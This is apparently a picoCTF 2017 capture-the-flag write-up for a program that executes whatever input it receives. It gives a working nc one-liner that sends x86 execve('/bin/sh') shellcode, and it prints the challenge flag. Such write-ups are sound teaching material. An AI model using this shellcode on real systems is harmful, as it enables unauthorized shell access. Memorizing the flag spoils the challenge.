## Shellz - 55

### Description

You no longer have an easy thing to call, but you have more space. Program: [shellz](./shellz)! [Source](./shellz.c). Connect on shell2017.picoctf.com:34621.

### Hint

  - There is a bunch of preexisting shellcode already out there!

### Write up

    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);

The pragram reads user input, saves it to `stuff` buffer.

    void (*func)() = (void (*)())stuff;

And executes the `stuff` buffer.

So we need to write a shellcode in the `stuff` buffer.

    $ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'; cat) | nc localhost 34621

You need to appen
d `cat` command after shellcode, in order not to exit program after executing shellcode.

> f6f01bf0649b5aa5ec299bb51c8f8db4
